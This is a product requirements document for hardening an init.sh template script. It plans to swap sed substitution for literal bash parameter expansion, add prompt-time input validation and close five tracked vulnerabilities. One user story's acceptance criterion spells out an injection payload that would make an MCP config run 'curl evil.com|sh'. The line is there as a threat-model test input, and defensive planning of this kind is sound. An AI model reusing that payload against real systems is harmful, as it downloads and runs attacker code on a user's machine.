---
prd:
  number: 248
  topic: substitution-surface-hardening
  created: 2026-05-03
  status: Approved with Concerns
  type: feature
triad:
  pm_signoff: {agent: product-manager, date: 2026-05-03, status: APPROVED, notes: "v1.2 final. Authored as BLP-02 Wave 1 closure for 5 /security vulns surfaced by 2026-05-02 scan in response to Daniel Wood LinkedIn note. 7 user stories (US-248-1..7), 15 success criteria across 5 dimensions (vuln closure / substitution semantics / input validation / posture defaults / ADR + release trigger), 8 functional requirements, 5 NFRs, 7-test Regression Protection Plan, full BLP-02 Wave fit and constitution alignment. All 4 open questions (Q-1..Q-4) adjudicated and folded in. Pass 1 review revealed 2 BLOCKING + 3 HIGH from Architect; v1.1 addressed all; v1.2 housekeeping cleared remaining N-1, N-2 prose inconsistencies. Net 8d active / 10d hard ceiling timeline preserved. PM-controlled LinkedIn comment decoupled from feature merge calendar."}
  architect_signoff: {agent: architect, date: 2026-05-03, status: APPROVED_WITH_CONCERNS, notes: "Pass 2 (v1.1): All Pass 1 BLOCKING (B-1 pytest-via-subprocess; B-2 init.sh write→load→substitute reorder pattern P1) + HIGH (H-1 US-248-6 defense-in-depth language; H-2 NFR-4 measurable thresholds; H-3 .aod/templates/ paths) RESOLVED. 2 NEW housekeeping findings: N-1 (5 stale templates/ prose hits inconsistent with FR-5 canonical .aod/templates/) and N-2 (DoD line said '6 tests' while enumerating 7) — both addressed in v1.2 housekeeping pass. Q-1 → Option (b) remove mcp-config.json; Q-2 → Option (b) new sourced helper file. NFR-4 has measurable benchmark contract; ADR-038 §Decision will document residual-scan regex character class. Sign-off: APPROVED_WITH_CONCERNS, promotes to APPROVED on v1.2 (already applied). Full review: .aod/results/architect.md."}
  techlead_signoff: {agent: team-lead, date: 2026-05-03, status: APPROVED_WITH_CONCERNS, notes: "Pass 1 (v1.0): 0 BLOCKING, 2 HIGH, 5 MEDIUM, 3 LOW. Q-3 adjudicated Option (b) re-init NOT supported. Timeline verdict: Optimistic with 12.5% buffer floor; 10d hard ceiling preserved (2026-05-04→2026-05-15). Stream 5 +0.5d (CI matrix risk) reabsorbed from Stream 4 ADR. SC-15 LinkedIn decoupled to 'within 5 business days of release-please PR merge'. F-1→F-2 reuse framing precision flagged for spec.md (validation triplet pattern, NOT helper function — folded into v1.1 Dependencies section). Day 5 (Wed 2026-05-08) slip-watch checkpoint named. Full review: .aod/results/team-lead.md."}
source:
  idea_id: 248
  story_id: null
---

# F-1 — Substitution Surface Hardening: Product Requirements Document

**Status**: Approved with Concerns (v1.2 final — Pass 2 Architect APPROVED_WITH_CONCERNS, Team-Lead APPROVED_WITH_CONCERNS, PM APPROVED. v1.1 addressed all Pass 1 BLOCKING + HIGH; v1.2 housekeeping cleared N-1, N-2)
**Created**: 2026-05-03
**Author**: product-manager
**Reviewers**: architect, team-lead
**Phase**: BLP-02 Wave 1 — first feature in the 5-feature enterprise hardening initiative; visible response to Daniel Wood's 2026-05-02 LinkedIn note
**Priority**: P1 (ICE 22 — I:8 C:7 E:7)

---

## 📋 Executive Summary

### The One-Liner

Eliminate the brittle `sed`-based template substitution path in `scripts/init.sh` by routing every personalization placeholder through the existing safe `aod_template_substitute_placeholders` function (bash parameter expansion, literal substitution), add prompt-time input validation, gitignore the personalization snapshot, and migrate the constitution cleanup off `sed` — closing five `/security` vulnerabilities (1 HIGH + 2 MEDIUM + 2 LOW) in a single coherent PR with public ADR-038 and a release-please trigger.

### Problem Statement

On 2026-05-02 Daniel Wood (MD, security reviewer) publicly flagged on LinkedIn that **"`init.sh` uses a brittle `sed` implementation with unsafe substitution that can lead to integrity issues or even local command execution downstream"** and asked the obvious question: **"Why not use bash parameter expansion (literal substitution) like you do here `.aod/scripts/bash/template-substitute.sh`?"** The same day, a targeted `/security` scan of the substitution surface confirmed the finding empirically and surfaced four related defects in the same surface — substantiating Daniel's read with a multi-hop execution chain that lands in `.claude/mcp-config.json` (a JSON file Claude Code parses to spawn MCP server processes), demonstrating that a carefully crafted `PROJECT_NAME` containing JSON metacharacters could inject an `mcpServers` entry whose `command` runs attacker-supplied code at the next Claude Code launch.

The five findings cluster into one coherent posture surface — the **placeholder substitution path** that runs at adopter init time:

1. **TACHI-VULN-6bc17fd01ac8 (HIGH, CVSS 8.1, A03 Injection)** — `scripts/init.sh:124` `replace_in_files()` uses `sed -i -e "s|{{KEY}}|$value|g"` which interprets `&`, `\`, `|`, and `\1`-`\9` in the replacement string. Concrete failure modes: `AT&T` becomes `ATtachiT` (silent integrity loss); `foo|bar` terminates the substitution expression. Multi-hop chain: substituted output lands in `.claude/mcp-config.json` and 13 `.claude/agents/*.md`/`commands/*.md` files; a crafted `PROJECT_NAME` could inject an MCP server entry whose `command` runs at next Claude Code launch. **Daniel-flagged.**

2. **TACHI-VULN-77f0519f9cfb (MEDIUM, CVSS 5.3, A03 Injection)** — `scripts/init.sh:24-28` `read -p` prompts accept arbitrary input including newlines, NUL, and control characters. Defense-in-depth requires prompt-time rejection so adopters get immediate feedback rather than running 60 seconds of substitution before hitting an opaque write-time abort.

3. **TACHI-VULN-bc67ca510ea9 (MEDIUM, CVSS 5.5, A05 Security Misconfiguration)** — `.aod/personalization.env` is created at init time with all 12 canonical placeholder values, including `PROJECT_DESCRIPTION` which may contain pre-launch product positioning. The current `.gitignore` already includes the entry (line 222, added 2026-04-19 in commit `b27f3ea`) — but the recommended **migration documentation** for existing adopters who already committed the file is missing from CHANGELOG, and `contracts/personalization-schema.md` does not yet document the local-only default. **Closure verification required:** confirm gitignore presence, add migration line to CHANGELOG, update the personalization-schema contract.

4. **TACHI-VULN-30bbfd90959a (LOW, CVSS 3.7, A03 Injection)** — `.claude/mcp-config.json:6,9` contains `{{PROJECT_PATH}}` placeholders. `PROJECT_PATH` is **not** in the canonical-12 placeholder list (`.aod/scripts/bash/template-substitute.sh:50-63`). Even after F-1 lands, this orphan placeholder will remain unsubstituted, leaving the MCP config non-functional. **Disposition decision required pre-spec** — Architect adjudication.

5. **TACHI-VULN-18127be5d214 (LOW, CVSS 3.1, A03 Injection)** — `scripts/init.sh:235-241` runs two additional `sed -i` invocations on `.aod/memory/constitution.md` to strip HTML comment blocks and template-instruction sections. Same metacharacter-interpretation class as F-1; risk is brittleness rather than direct exploit because the substitution patterns are static, but the constitution.md content can contain `&`/`\` in legitimate prose.

The repository **already implements the safe alternative** in `.aod/scripts/bash/template-substitute.sh:318-411` — the `aod_template_substitute_placeholders` function uses bash parameter expansion (`${str//pat/rep}`, literal on both sides), is contract-defined, unit-tested, and is already used by `/aod.update`. **`init.sh` is the lone holdout.** The fix is not invention; it is adoption of an existing in-repo capability across the surface.

This PRD is the **first feature of BLP-02 (Enterprise Hardening Initiative)** — the 5-feature blueprint opened 2026-05-02 in response to Daniel's LinkedIn note. It is also the **public-posture test**: the visible commit that demonstrates tachi can ship a coherent posture response — code change + ADR + CHANGELOG + REMEDIATED transition + LinkedIn comment — at speed.

### Proposed Solution

This feature ships as **one feature branch, one squash-merged PR, one `feat(248):` commit subject** that triggers a release-please PR. Six coordinated work items, no new agent files, no orchestrator phase additions, no `finding.yaml` schema bump:

1. **Sed → bash parameter expansion (closes TACHI-VULN-6bc17fd01ac8 HIGH).** Replace `replace_in_files()` in `scripts/init.sh:117-159` with a loop calling `aod_template_substitute_placeholders` per file. **`init.sh` MUST be reordered** to align with the substitute function's contract (per Architect Pass 1 BLOCKING B-2): the existing flow is "set vars → sed-substitute → write `.aod/personalization.env` snapshot → version-pin → self-delete"; the new flow is "set vars → **write `.aod/personalization.env` snapshot first** → `aod_template_load_personalization_env .aod/personalization.env` (sets `AOD_PERSONALIZATION_<KEY>` env vars expected by the substitute function) → **`aod_template_substitute_placeholders` per file** → `aod_template_assert_no_residual` per file → version-pin → self-delete." Source `.aod/scripts/bash/template-substitute.sh` once at the top of `init.sh`. Preserve the existing `find` filter (excluding `.git/`, `node_modules/`, binary extensions). Result: every personalization placeholder substitutes literally — `AT&T`, `foo|bar`, `\1\2 backref`, `'single-quoted'`, `"double-quoted\"escaped"`, multibyte UTF-8 (`Ⅷ-Ⅸ`) all survive byte-identical. The reorder is conceptually clean: it collapses two substitution paths (`init.sh` and `update.sh`) into the single canonical entry point.

2. **Post-substitution residual scan (defense-in-depth, also catches F-orphan).** After the substitution loop, call `aod_template_assert_no_residual` on each substituted file. Any unhandled `{{KEY}}` halts init non-zero with a clear error pointing to the file and the orphan placeholder. This converts F-orphan from a silent integrity loss into an explicit fail-fast.

3. **PROJECT_PATH disposition (closes TACHI-VULN-30bbfd90959a LOW).** **Recommended (Option b):** Remove `.claude/mcp-config.json` from the template entirely. The file is unwired — Claude Code's MCP config lives in `~/.config/claude-code/`, not in the project tree. Keeping it as a template example is misleading. **Alternative (Option a):** Add `PROJECT_PATH` as the 13th canonical placeholder, populate it from `pwd` at init time, document in `contracts/personalization-schema.md`. **Architect adjudication in spec stage.** Default to Option (b) unless Architect surfaces a wired downstream consumer.

4. **`read -p` validation helper (closes TACHI-VULN-77f0519f9cfb MEDIUM).** New helper `aod_init_read_validated <prompt> <var_name> <max_len>` wraps each `read -p` invocation in `init.sh:24-28`. Rejection criteria: newlines, NUL byte, non-printable ASCII control chars (0x00-0x1F except space), over-length input. Length caps: 100 chars for names/orgs/repos, 300 for description, 200 for tech-stack values. Re-prompts up to 3 times with a one-line rejection reason; exits non-zero on the 3rd consecutive failure. Bash 3.2 compatible (target macOS pre-installed bash).

5. **Personalization gitignore migration (closes TACHI-VULN-bc67ca510ea9 MEDIUM).** Verify `.gitignore` includes `.aod/personalization.env` (already present per `b27f3ea` 2026-04-19). Update `contracts/personalization-schema.md` to document **local-only as the default** (commit-tracked is opt-in via removing the gitignore line). Add migration line to CHANGELOG with a copy-pasteable command for adopters who already committed the file: `git rm --cached .aod/personalization.env && git commit -m "chore: untrack personalization snapshot per BLP-02 default"`. Mark the post-init success message in `init.sh` to call out the gitignore default.

6. **Constitution sed migration (closes TACHI-VULN-18127be5d214 LOW).** Replace the two `sed -i` invocations at `scripts/init.sh:235-241` with a copy of one of two pre-stripped templates: `.aod/templates/constitution-instructional.md` (full, with template-instruction blocks) and `.aod/templates/constitution-clean.md` (post-strip output). `init.sh` copies the clean variant; the instructional variant is retained as documentation for downstream forks who want the embedded guidance.

**Three things this feature is deliberately NOT:**

1. It is **not** a generalized substitution-engine refactor. The scope is the five named CVE-class vuln_ids and their direct surface in `scripts/init.sh` + `.gitignore` + `contracts/personalization-schema.md` + `.aod/templates/constitution-*.md`. The Wave 2 BLP-02 features (`source`-without-validation pattern in `defaults.env` and `aod-kit-version`) are out of scope and will ship as separate features.

2. It is **not** a new substitution function. `aod_template_substitute_placeholders` and `aod_template_assert_no_residual` exist, are contract-defined, are unit-tested, and are used by `/aod.update`. F-1 wires `init.sh` to the existing function, not the inverse.

3. It is **not** a `finding.yaml` or `taxonomy/*.yaml` schema change. BLP-02 closes posture findings against tachi-the-template; the BLP-01 detection-tier contract is preserved. **Eighth feature in a row with zero `finding.yaml` shape change.**

### Success Criteria

#### Vulnerability closure (5 of 5 — primary)

- **SC-1** — All five vuln_ids transition `DETECTED → REMEDIATED` in `.security/vulnerabilities.jsonl` with timestamps and the merging commit SHA recorded:
  - TACHI-VULN-6bc17fd01ac8 (HIGH — sed metachar)
  - TACHI-VULN-77f0519f9cfb (MEDIUM — read -p validation)
  - TACHI-VULN-bc67ca510ea9 (MEDIUM — personalization.env gitignore)
  - TACHI-VULN-30bbfd90959a (LOW — orphan PROJECT_PATH)
  - TACHI-VULN-18127be5d214 (LOW — constitution sed)
- **SC-2** — Post-merge `/security` re-scan against `main` HEAD produces zero new findings within the substitution surface this feature touched (`scripts/init.sh`, `.gitignore`, `contracts/personalization-schema.md`, `.aod/templates/constitution-*.md`, `.claude/mcp-config.json` if Option (a), or absent if Option (b)).

#### Substitution-semantics correctness

- **SC-3** — `replace_in_files()` is removed from `scripts/init.sh`; replaced by a loop calling `aod_template_substitute_placeholders` per file. `init.sh` sources `.aod/scripts/bash/template-substitute.sh` exactly once. **`init.sh` flow is reordered** so that `.aod/personalization.env` is written BEFORE the substitution loop, and `aod_template_load_personalization_env .aod/personalization.env` is called BEFORE `aod_template_substitute_placeholders` (per Architect Pass 1 BLOCKING B-2 adjudication: pattern P1 — reorder, NOT P2 shim or P3 mutate-shared-library).
- **SC-4** — `aod_template_assert_no_residual` is called on every substituted file after the substitution loop; init halts non-zero on any residual `{{KEY}}` with a message naming the file and the orphan placeholder.
- **SC-5** — Adversarial-input fixture-replay test produces byte-identical output to a recorded baseline tree across **at least 10 inputs**: `AT&T`, `foo|bar`, `\1\2 backref`, `'single-quoted'`, `"double-quoted\"escaped"`, multibyte UTF-8 (`Ⅷ-Ⅸ`), leading whitespace, trailing whitespace, multi-line paste (rejected at prompt), NUL paste (rejected at prompt).

#### Input validation correctness

- **SC-6** — All four `read -p` prompts in `scripts/init.sh:24-28` are wrapped in `aod_init_read_validated`. Rejection on newline / NUL / control char / over-length is observed in test cases; re-prompt loop runs up to 3 times; exit non-zero on the 3rd failure.

#### Adopter-posture defaults

- **SC-7** — `.gitignore` contains `.aod/personalization.env` (verified at HEAD). `contracts/personalization-schema.md` documents local-only as the default with the opt-in opt-out path. CHANGELOG entry includes the migration command for previously-committed files.
- **SC-8** — Constitution cleanup uses `.aod/templates/constitution-clean.md` copy (no `sed`). Post-init `.aod/memory/constitution.md` matches `.aod/templates/constitution-clean.md` byte-for-byte.

#### PROJECT_PATH disposition

- **SC-9** — One of the two options is implemented per Architect adjudication in spec.md:
  - **Option (b) RECOMMENDED:** `.claude/mcp-config.json` removed from the template; CHANGELOG documents the rationale; no orphan placeholder remains.
  - **Option (a) ALTERNATIVE:** `PROJECT_PATH` added as the 13th canonical placeholder in `.aod/scripts/bash/template-substitute.sh:50-63`; populated from `pwd` at init time; documented in `contracts/personalization-schema.md`.

#### ADR + governance + release-trigger

- **SC-10** — Public ADR-038 *"Placeholder Substitution Strategy"* is authored in `docs/architecture/02_ADRs/ADR-038-placeholder-substitution-strategy.md` documenting the sed → bash parameter expansion migration, the alternatives considered (sed escaping, awk, Python, Perl), the rationale (in-repo function already exists; bash 3.2 compatible; literal substitution by language semantics), and the disposition of PROJECT_PATH. Status: Proposed → Accepted dual-commit pattern per ADR convention.
- **SC-11** — Triple Triad sign-off recorded on `tasks.md` (PM + Architect + Team-Lead).
- **SC-12** — PR title is Conventional-Commits-formatted as `feat(248): harden init.sh substitution surface — sed → bash param expansion + input validation + gitignore default`. Belt-and-suspenders release verification per `.claude/rules/git-workflow.md`: post-merge `gh pr list --state open --search "release-please" --limit 3` returns a release-please PR within ~30s; if not, push an empty release-marker commit `feat(248): substitution surface hardening — release marker`.

#### Cross-cutting

- **SC-13** — Zero new runtime dependencies — empty diff on `pyproject.toml`, `requirements*.txt`, `package.json`, or any other dependency manifest.
- **SC-14** — All Regression Protection Plan tests pass on macOS (bash 3.2 default) AND Linux (bash 4+) via the **existing pytest CI matrix** (per Architect Pass 1 BLOCKING B-1 adjudication: pytest-via-subprocess, NOT bats — bats CI infrastructure does not yet exist in this repo and bootstrapping it is out of scope for F-248). Test files land at `tests/scripts/test_init_sh_*.py` consistent with the existing pytest convention.

(SC-15 is moved out of Success Criteria — see *Public Visibility Action* subsection below per Architect L-3. SC-15 is a PM-controlled manual action with no calendar binding to F-248's merge.)

### Timeline

Target: **8 working days** active + buffer (P1 priority, single-stream feature, in-repo function already exists, scope is concrete). **Hard ceiling: 10 working days (2 weeks).**

Delivery window: 2026-05-04 (Mon, Day 1) → 2026-05-15 (Fri, Day 10 hard ceiling). Day 8 (Wed 2026-05-13) is the merge target. Day 5 (Wed 2026-05-08) is the **slip-watch checkpoint** per Team-Lead Pass 1 — if Stream 5 hasn't recorded a green CI matrix run by Day 5 EOD, escalate to PM for scope-cut adjudication.

The work admits limited parallelism — substitution adoption (Stream 1) is the critical path; input validation (Stream 2), posture defaults (Stream 3), and ADR drafting (Stream 4) are all independent and can advance in parallel. Test infrastructure (Stream 5) depends on Stream 1 landing first.

| Stream | Items | Days | Critical path? |
|---|---|---|---|
| Stream 1: Substitution adoption | SC-3, SC-4, SC-5, SC-9 (PROJECT_PATH disposition pre-decided in spec) | 2.5d | YES |
| Stream 2: Input validation | SC-6 | 1.0d | NO — independent, can start Day 1 |
| Stream 3: Posture defaults | SC-7, SC-8 | 0.5d | NO — one-commit adds |
| Stream 4: ADR + release trigger | SC-10, SC-11, SC-12 | 0.5d | NO — ADR compresses to 0.5d (Architect Pass 1 alternatives-considered list pre-enumerated in FR-6) |
| Stream 5: Test infrastructure (pytest) | SC-2, SC-5, SC-14 + Test-1..Test-7 | 3.0d | YES — Stream 5 has 0.5d CI iteration buffer baked in (per Team-Lead H-1) |

**Total**: 7.5d active + 0.5d Stream 5 CI buffer = **8d** total, with **0.5d reabsorption authority** Stream 4 → Stream 5 if CI iteration costs more than the 0.5d baked-in buffer (per Team-Lead M-1 buffer-floor logic). 12.5% buffer floor; 10d hard ceiling.

**Single-agent serial assumption**: 8d active is realistic for a single `senior-backend-engineer` agent on this surface (per Team-Lead resource-allocation). Two-agent parallel could compress to 5d active (one agent on Stream 1+5 critical path, one on Streams 2+3+4) but the coordination overhead on the squash-merge sequencing for a single-PR feature is net wash. Single-agent serial is the recommended assignment.

**Re-init NOT supported** (per Team-Lead Q-3 adjudication, Option (b)): the existing `init.sh` self-delete at `:354` (`rm -f scripts/init.sh`) IS the re-init prevention mechanism (per Architect M-3). Spec.md adds a one-line pre-flight check at the top of `init.sh`: if `.aod/personalization.env` exists, exit non-zero with `[init] FATAL: Repository already personalized. Re-init is not supported. To re-personalize, remove .aod/personalization.env and re-run init.sh.`

---

## 🎯 Strategic Alignment

### Product Vision Alignment

**Reference**: [docs/product/01_Product_Vision/product-vision.md](../01_Product_Vision/product-vision.md)

tachi's positioning is *"the upstream machine-readable contract that AI security point tools consume"* — and the upstream contract must itself ship clean. A template that recommends posture-hardening practices to adopters while holding `sed`-based substitution and unsigned `source` patterns in its own init script is not a credible source-of-truth artifact. F-1 closes the most visible posture gap (the one Daniel Wood named in public on LinkedIn), demonstrates a closed-loop response cycle (LinkedIn → /security → BLP-02 → ADR-038 → release-please → public LinkedIn comment), and converts a reputational liability into a marketable evidence trail for enterprise-buyer pre-sales review.

### BLP-02 Initiative Fit

F-1 is **Wave 1 / Feature 1 of 5** in BLP-02 (Enterprise Hardening Initiative), opened 2026-05-02 in direct response to Daniel Wood's LinkedIn note. The five-feature blueprint:

```
Wave 1 — Substitution surface (THIS FEATURE — P1)
  F-1 (#248) — Substitution Surface Hardening
       │ closes: TACHI-VULN-6bc17fd01ac8 (HIGH) + 4 related findings
       │ ADR-038
       │
Wave 2 — Source-without-validation (P1)
  F-2 — defaults.env strict KV parser
  F-3 — aod-kit-version buffered parse + eval → printf -v migration
       │
Wave 3 — Adopter posture (P1)
  F-4 — SECURITY.md disclosure path + private vuln reporting + clone timeout
       │
Wave 4 — Daniel's broader checklist (P1)
  F-5 — Hardened Claude permissions baseline + pre-commit secret-scan defaults
```

F-1 ships first because it is the highest-severity finding (CVSS 8.1 HIGH), the most publicly visible (Daniel's LinkedIn note literally names it), and the lowest-implementation-cost (the safe function already exists in-repo and is unit-tested). Closure of F-1 plus its public ADR-038 establishes the BLP-02 cadence for the remaining four features.

### Constitution Alignment

**Reference**: [.aod/memory/constitution.md](../../.aod/memory/constitution.md)

- **III. Backward Compatibility (NON-NEGOTIABLE):** `aod_template_substitute_placeholders` is already used by `/aod.update`; F-1's adoption in `init.sh` introduces zero new failure mode for adopters who run `init.sh` cleanly today. The substitution semantics change from "regex-with-metachar-interpretation" to "literal" — this is a strict improvement. Existing adopters are not affected because `init.sh` is run once at adoption; re-init is not a supported flow. The gitignore migration is documented with a copy-pasteable command.
- **VIII. Posture-as-Evidence:** F-1 is the visible posture commit that converts five `DETECTED` events to `REMEDIATED` events with full traceability — the kind of evidence enterprise-buyer security architects look for in pre-sales review.

---

## 👥 User Stories

### US-248-1 — Adopter with metacharacter-bearing project name

**As an** adopter running `init.sh` whose project name is `AT&T` (or any name containing `&`, `\`, `|`, `'`, or `"`),
**I want** my project name to substitute literally into every personalization-target file,
**so that** values like `AT&T` survive byte-identical and don't silently corrupt downstream parsers (`.claude/mcp-config.json`) or break the substitution expression altogether.

**Acceptance**: After running `init.sh` with `PROJECT_NAME=AT&T`, every occurrence of `tachi` in personalization-target files contains the literal string `AT&T` — no `ATtachiT`, no truncation at `&`. Verified via `grep -r "AT&T" <substituted-tree>` matching the expected count from the baseline fixture.

### US-248-2 — Adopter who pastes a multi-line value

**As an** adopter who accidentally pastes a multi-line value (e.g., copying from a wrapped Slack message) into a `read -p` prompt,
**I want** immediate rejection with a clear "newlines not allowed; please re-enter" message,
**so that** I can fix the input on the spot rather than running 60 seconds of substitution and then hitting an opaque write-time abort.

**Acceptance**: Pasting `"foo\nbar"` (multi-line) into the `PROJECT_NAME` prompt produces a rejection message naming the offending character class (newline) and re-prompts. After 3 consecutive rejections, init exits non-zero with a clear final message.

### US-248-3 — Adopter who runs `git add -A` after init

**As an** adopter who runs `git add -A` (or `git add .aod/`) after init,
**I want** my `PROJECT_DESCRIPTION` (which may contain pre-launch product positioning) NOT to commit by default,
**so that** I don't accidentally publish proprietary positioning to a public template fork.

**Acceptance**: After running `init.sh` and `git add -A`, `git status` does not stage `.aod/personalization.env`. The file is gitignored. Adopters who want it tracked can opt in by removing the gitignore line.

### US-248-4 — Maintainer auditing the substitution surface

**As a** maintainer reviewing the substitution surface,
**I want** all `sed` usage in `init.sh` removed (both the `replace_in_files()` invocation and the constitution.md cleanup invocations),
**so that** no future point-fix introduces a different validation pattern that could regress posture, and so the substitution surface has exactly one canonical implementation.

**Acceptance**: `grep -n "sed " scripts/init.sh` returns zero matches after F-1. The constitution cleanup uses pre-stripped templates and a `cp` invocation. ADR-038 establishes one canonical substitution pattern across `init.sh` and `update.sh`.

### US-248-5 — Security reviewer tracing the placeholder contract

**As a** security reviewer evaluating whether tachi's substitution contract is self-consistent,
**I want** every placeholder appearing in any template file to be a member of the canonical-12 (or canonical-13 if Option (a)) set,
**so that** the contract is closed — no orphan placeholders that fail-silent.

**Acceptance**: `aod_template_assert_no_residual` runs against every substituted file post-init and finds zero residual `{{KEY}}`. PROJECT_PATH disposition (Option (a) or (b)) eliminates the current orphan. Adding a new template file with a non-canonical placeholder fails CI, not adopters.

### US-248-6 — Security reviewer tracing the multi-hop chain

**As a** security reviewer evaluating tachi's substitution surface against a multi-hop execution-chain threat model,
**I want** literal substitution enforced AND a residual-placeholder scan AND prompt-time rejection of dangerous control characters,
**so that** no JSON metacharacter or shell metacharacter in user input can land in a downstream parser (`.claude/mcp-config.json` for MCP server spawning, `.claude/agents/*.md` for LLM instructions) and cause unintended execution at next Claude Code launch.

**Acceptance**: A crafted `PROJECT_NAME` containing `","command":"sh","args":["-c","curl evil.com|sh"]},"x":"` is rejected at prompt time (over-length AND control-character class). If the prompt is bypassed (e.g., pre-populated env var), bash parameter expansion substitutes literally — preventing the **sed-class metachar interpretation** vector. The residual JSON-context-aware injection risk (a payload with matched JSON syntax landing in a JSON-string position and producing valid-but-malicious JSON) is mitigated by the **defense-in-depth combination** of (a) prompt-time control-character + length-cap rejection in FR-2, (b) the `aod_template_assert_no_residual` post-substitution scan, and (c) the F-4 disposition removing `.claude/mcp-config.json` from the template entirely (Q-1 adjudicated Option (b) — eliminating the JSON-parser sink for placeholder-derived bytes). The substitution semantics alone do NOT neutralize all JSON-injection vectors (per Architect Pass 1 H-1); the defense-in-depth chain is what makes the multi-hop chain non-exploitable.

### US-248-7 — Enterprise security architect doing pre-sales review

**As an** enterprise security architect evaluating tachi for procurement,
**I want** to see one coherent commit per closed posture finding (PR + public ADR + CHANGELOG entry + REMEDIATED transition + release-please trigger),
**so that** I can verify tachi's posture-claims-to-evidence ratio against the public artifact trail before recommending the tool.

**Acceptance**: F-1's PR squash-merge is `feat(248): harden init.sh substitution surface ...`; ADR-038 is committed in `docs/architecture/02_ADRs/`; `.security/vulnerabilities.jsonl` shows 5 `DETECTED → REMEDIATED` transitions with the merge SHA; release-please opens a release PR within ~30s post-merge; the LinkedIn comment links all four artifacts.

---

## 🔧 Functional Requirements

### FR-1 — `replace_in_files()` removed; substitution routes through existing safe function (with init.sh reorder)

`scripts/init.sh:117-159` `replace_in_files()` is removed. The new flow (per Architect Pass 1 BLOCKING B-2 adjudication, pattern P1 — reorder, NOT shim, NOT mutate-shared-library):

1. **Source**: `.aod/scripts/bash/template-substitute.sh` once at top of `init.sh` (replaces line 336 which today sources it later).
2. **Set vars**: read prompts via `aod_init_read_validated` (FR-2) → `PROJECT_NAME`, `PROJECT_DESCRIPTION`, `GITHUB_ORG`, `GITHUB_REPO` set in caller scope (existing line range `:24-87`).
3. **Write snapshot FIRST** (reordered from current `:346`): write `.aod/personalization.env` with all 12 canonical KEY=VALUE pairs.
4. **Load snapshot**: `aod_template_load_personalization_env .aod/personalization.env` — sets `AOD_PERSONALIZATION_<KEY>` env vars in the caller scope. This is a strict pre-condition of `aod_template_substitute_placeholders` (per the docstring at `template-substitute.sh:312-313`); without it, every value substitutes to the empty string.
5. **Substitute**: for each file matching the existing `find` filter (excluding `.git/`, `node_modules/`, binary extensions per the existing function), call `aod_template_substitute_placeholders <src> <dest>` (in-place: `<src>` and `<dest>` are the same path).
6. **Residual scan**: after the substitution loop, call `aod_template_assert_no_residual <file>` for each substituted file. Any residual `{{KEY}}` halts init non-zero with a message naming the file and the orphan placeholder.
7. **Version-pin + self-delete**: existing flow preserved.

**Pre-flight check (re-init prevention, per Team-Lead Q-3 Option b + Architect M-3)**: at the top of `init.sh` (after sourcing the library), check if `.aod/personalization.env` exists; if it does, exit non-zero with `[init] FATAL: Repository already personalized. Re-init is not supported.` This works in conjunction with the existing self-delete at `:354` (which makes re-running `init.sh` literally impossible after a successful run since the script has been removed).

**Performance benchmark (per Architect H-2)**: Stream 1 Day 1 includes a benchmark of the new substitution path against the old `sed`-based path on the canonical fixture (timed via `time` builtin; recorded in ADR-038 §Consequences). NFR-4's 10% cap is the soft floor; if the canonical fixture shows a delta >5%, ADR-038 documents the actual delta and adjusts the cap with rationale.

The `find` filter (excluding `.git/`, `node_modules/`, binary extensions per the existing function) is preserved. No file currently substituted ends up un-substituted; no file currently un-substituted ends up substituted. The substitution semantics change from sed-regex to bash literal — this is a strict improvement covered by the byte-comparison Test-1.

### FR-2 — `aod_init_read_validated` helper added; all four `read -p` prompts wrapped

A new helper function `aod_init_read_validated <prompt> <var_name> <max_len>` is added (location: top-of-file in `init.sh` OR a new sourced helper file; Architect adjudicates in spec). Behavior:

1. Calls `read -r -p "$prompt" answer`.
2. Validates `$answer` against:
   - No newline (read -r already strips trailing newline; explicit check for embedded `\n` via `[[ "$answer" =~ $'\n' ]]`).
   - No NUL (`[[ "$answer" =~ $'\0' ]]`).
   - No control characters (0x00–0x1F except space; pattern `[[:cntrl:]]`).
   - Length ≤ `$max_len`.
3. On rejection, prints `[init] Input rejected: <reason>; please re-enter.` and re-prompts. After 3 consecutive rejections, exits non-zero with `[init] FATAL: 3 consecutive invalid inputs for $var_name; aborting.`
4. On acceptance, sets the variable named by `$var_name` via `printf -v "$var_name" '%s' "$answer"` (no eval).

Length caps (with sources, per Architect Pass 1 L-1):
- `PROJECT_NAME`: 100 chars (GitHub repo name limit; product cap).
- `GITHUB_ORG`: **39 chars** (GitHub login/org name actual hard limit; tightened from initial 100 per Architect L-1).
- `GITHUB_REPO`: 100 chars (GitHub repo name limit).
- `PROJECT_DESCRIPTION`: 300 chars (GitHub description limit is 350; product cap at 300).
- Tech-stack values: 200 chars (arbitrary product cap; covers reasonable framework/library identifiers).

**Helper file location** (Q-2 adjudicated by Architect Pass 1 — Option (b)): the helper lives in a NEW sourced file `.aod/scripts/bash/init-input.sh`, consistent with the existing `template-*.sh` library pattern (`template-substitute.sh`, `template-validate.sh`, `template-git.sh`). Rationale: (a) consistency with existing convention; (b) F-2 (Wave 2 — defaults.env) reuses the **rejection pattern + `printf -v` triplet** documented in ADR-038, NOT the `aod_init_read_validated` function itself (which is interactive `read -p` only — F-2 is non-interactive file-parse). Per Team-Lead Pass 1 H-2, spec.md MUST frame the F-1→F-2 reuse precisely: "F-2 reuses the validation triplet pattern (regex-validate → reject-on-mismatch → `printf -v` assignment) documented in ADR-038, NOT the `aod_init_read_validated` function."

The existing four `read -p` invocations at `scripts/init.sh:24-28` are migrated to call `aod_init_read_validated` with the appropriate prompt and length cap.

### FR-3 — `.gitignore` includes `.aod/personalization.env`; CHANGELOG documents migration

Verify `.gitignore:222` contains `.aod/personalization.env`. Update `contracts/personalization-schema.md` to document local-only as the default behavior (commit-tracked is opt-in via removing the gitignore line). Add a CHANGELOG entry for v4.x:

> **Hardened defaults**: `.aod/personalization.env` is now gitignored by default per BLP-02 F-1. Adopters who already committed the file should run:
> ```
> git rm --cached .aod/personalization.env
> git commit -m "chore: untrack personalization snapshot per BLP-02 default"
> ```

The post-init success message in `init.sh` calls out the gitignore default in one line.

### FR-4 — PROJECT_PATH disposition (Q-1 adjudicated: Option (b) — remove `.claude/mcp-config.json`)

**Adjudicated by Architect Pass 1**: **Option (b) — Remove `.claude/mcp-config.json` from the template entirely.** No `PROJECT_PATH` placeholder added to the canonical set. Rationale (per Architect Pass 1 Q-1):
- The file is unwired — Claude Code's MCP config lives in `~/.config/claude-code/`, not in the project tree.
- Adding `PROJECT_PATH` as a 13th canonical placeholder mutates a contract (`AOD_CANONICAL_PLACEHOLDERS` array, schema, lookup case statement, validation rules). Lockstep changes across multiple files for an unwired example template is poor surface-area economics.
